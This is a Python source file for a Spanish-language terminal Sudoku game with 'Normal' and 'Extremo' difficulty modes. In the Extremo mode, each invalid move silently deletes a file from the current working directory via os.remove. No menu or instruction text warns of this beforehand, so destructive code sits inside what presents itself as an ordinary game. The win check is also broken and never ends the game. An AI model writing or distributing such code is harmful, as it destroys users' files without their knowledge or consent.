from termcolor import colored
from random import randint,shuffle
from pyfiglet import Figlet
import os

# ------------------------------------------------------- BANNER
def Banner():  
    f = Figlet(font="smslant")  
    print(colored(f.renderText("SUDOKU"), "blue"))


# ------------------------------------------------------- MATRIZ
def Tablero():
    tablero = [[0] * 9 for _ in range(9)]
    Resolver(tablero)
    Cambiar_valores(tablero)
    return tablero
    

def Mostrar_tablero(matriz):
    """MUESTRA TABLERO POR PANTALLA"""
    print("\n")
    for f in range(9):
        if f % 3 == 0 and f != 0:
            print("-" * 41)  # Línea horizontal entre bloques
        for c in range(9):
            if c % 3 == 0 and c != 0:
                print("|", end=" ")  # Línea vertical entre bloques
            print("%3d" % matriz[f][c], end=" ")
        print()
    print(" ")

def Resolver(tablero):
    """RESUELVE TABLERO"""
    for fila in range(9):
        for columna in range(9):
            if tablero[fila][columna] == 0:
                numeros = list(range(1, 10))
                shuffle(numeros)  # Randomizar los números para la variabilidad
                for num in numeros:
                    if es_valido(tablero, fila, columna, num):
                        tablero[fila][columna] = num
                        if Resolver(tablero):
                            return True
                        tablero[fila][columna] = 0
                return False
    return True


def es_valido(tablero, fila, columna, num):
    '''COMPLETAR TABLERO'''
    # Verificar fila
    if num in tablero[fila]:
        return False

    # Verificar columna
    for i in range(9):
        if tablero[i][columna] == num:
            return False

    # Verificar subcuadro 3x3
    inicio_fila, inicio_columna = 3 * (fila // 3), 3 * (columna // 3)
    for i in range(inicio_fila, inicio_fila + 3):
        for j in range(inicio_columna, inicio_columna + 3):
            if tablero[i][j] == num:
                return False

    return True


def Cambiar_valores(tablero, vaciar=40):  
    """Remueve números del tablero para crear un rompecabezas con la cantidad deseada de celdas vacías."""  
    count = 0  
    while count < vaciar:  
        fila = randint(0, 8)  
        col = randint(0, 8)  
        if tablero[fila][col] != 0:  
            tablero[fila][col] = 0  
            count += 1  
    return tablero 
    
def tablero_completo(tablero):  
    """Verifica si el tablero está completo"""  
    for fila in tablero:  
        if 0 in fila:  
            return False


# -------------------------------------------------------------- INPUTS Y VALIDACIONES  
def posicion_num(tablero):  
    """Solicita al usuario una posición válida donde ingresar un número."""  
    while True:  
        try:  
            fila = int(input("[+] Ingresar Fila (1-9): ")) - 1  
            columna = int(input("[+] Ingresar Columna (1-9): ")) - 1  
            if 0 <= fila < 9 and 0 <= columna < 9:  
                if tablero[fila][columna] == 0:  
                    return fila, columna  
                else:  
                    print(colored("[!] Posición ya ocupada. Intenta de nuevo.", "red"))  
            else:  
                print(colored("[!] Fila o columna fuera de rango. Deben ser entre 1 y 9.", "red"))  
        except ValueError:  
            print(colored("[!] Entrada inválida. Por favor, ingresa números del 1 al 9.", "red"))  


def insert_num(tablero, num, fila, columna):  
    """Intenta insertar un número en el tablero en la posición dada."""  
    if es_valido(tablero, fila, columna, num):  
        tablero[fila][columna] = num  
        return True  
    return False  


def Seleccion_numero():  
    """Solicita al usuario un número entre 1 y 9."""  
    while True:  
        try:  
            num = int(input("[+] Ingresar Número (1-9): "))  
            if 1 <= num <= 9:  
                return num  
            else:  
                print(colored("[!] Número inválido. Debe ser entre 1 y 9.", "red"))  
        except ValueError:  
            print(colored("[!] Entrada inválida. Por favor, ingresa un número entre 1 y 9.", "red"))  

#-----------------------------------------------------------DIFICULTAD_NORMAL
def Dificultad_normal(tablero):
    """PARTIDA NORMAL"""
    try:
        numero = Seleccion_numero()
        Error = 0
        while True:
            Fila, Columna = posicion_num(tablero)
            if not insert_num(tablero, numero, Fila, Columna):
                Error+=1
                print(colored(f"[!] ERROR:{Error}","red"))
                if Error == 3:
                    print(colored("[!] Limite de ERRORES","red"))
                    break
            Mostrar_tablero(tablero)
            tablero_completo(tablero)
            numero = Seleccion_numero()
    except (IndexError,ValueError,TypeError):
        print(colored("[!] Indice fuera de rango","red"))


#--------------------------------------------------------------DIFICULTAD_EXTREMA
def Dificultad_extremo(tablero):
    """PARTIDA NORMAL"""
    try: 
        numero = Seleccion_numero()
        while True:
            Fila, Columna = posicion_num(tablero)
            if not insert_num(tablero, numero, Fila, Columna):
                lista = listar_archivos() 
                borrar_archivos(lista)
            Mostrar_tablero(tablero)
            tablero_completo(tablero)
            numero = Seleccion_numero()
    except (IndexError,ValueError,TypeError):
        print(colored("[!] Indice fuera de rango","red"))


listar_archivos = lambda: list(filter(os.path.isfile, os.listdir('.'))) 

def borrar_archivos(lista):
    nombre_archivo = lista[0]    
    if os.path.isfile(nombre_archivo):    
        os.remove(nombre_archivo)  
        print(colored(f"[!] El archivo '{nombre_archivo}' ha sido borrado.","red"))   

#----------------------------------------------------------MOSTRAR_OPCIONES
def Mostrar_inicio():  
    """Muestra las opciones iniciales del juego y retorna la elección del usuario."""  
    opciones = {  
        1: "Nueva Partida",  
        2: "Instrucciones",  
        3: "Salir"  
    }  
    print("\n===== MENÚ PRINCIPAL =====")  
    for clave, valor in opciones.items():  
        print(f"{clave}. {valor}")  
    while True:  
        try:  
            choice = int(input("[+] Ingresar opción: "))  
            if choice in opciones:  
                return choice  
            else:  
                print(colored("[!] Opción inválida. Selecciona una opción válida.", "red"))  
        except ValueError:  
            print(colored("[!] Entrada inválida. Por favor, ingresa un número correspondiente a las opciones.", "red"))  


def Mostrar_Modo():  
    """Muestra los modos de dificultad y retorna la elección del usuario."""  
    modos = {  
        1: "Normal",  
        2: "Extremo",  
        3: "Regresar al Menú Principal"  
    }  
    print(colored("\n===== SELECCIONA DIFICULTAD =====","magenta"))  
    for clave, valor in modos.items():  
        print(f"{clave}. {valor}")  
    while True:  
        try:  
            modo = int(input("[+] Ingresar modo: "))  
            if modo in modos:  
                return modo  
            else:  
                print(colored("[!] Modo inválido. Selecciona una opción válida.", "red"))  
        except ValueError:  
            print(colored("[!] Entrada inválida. Por favor, ingresa un número correspondiente a las opciones.", "red")) 
# ----------------------------------------------------------------#INICIO_PARTIDA
def Inicio():
    """ELECCION DE MODO"""
    juego_inicio = Mostrar_inicio()
    tablero = Tablero()
    if juego_inicio == 1:
        print()
        modo = Mostrar_Modo()
        if modo == 1:
            Mostrar_tablero(tablero)
            Dificultad_normal(tablero)
        if modo == 2:
            Mostrar_tablero(tablero)
            Dificultad_extremo(tablero)

    if juego_inicio == 2:
        print(
            colored(
                "\nEl objetivo del Sudoku es llenar todas las celdas vacías en un tablero de 9x9 de manera que cada fila,\ncada columna y cada una de las nueve subcuadrículas de 3x3 contenga todos los números del 1 al 9 sin repetir ninguno.\n",
                "green",
            )
        )
        Inicio()

# ------------------------------------------------------- PROGRAMA PRINCIPAL
def main():
    Banner()
    Inicio()

if __name__ == "__main__":
    main()
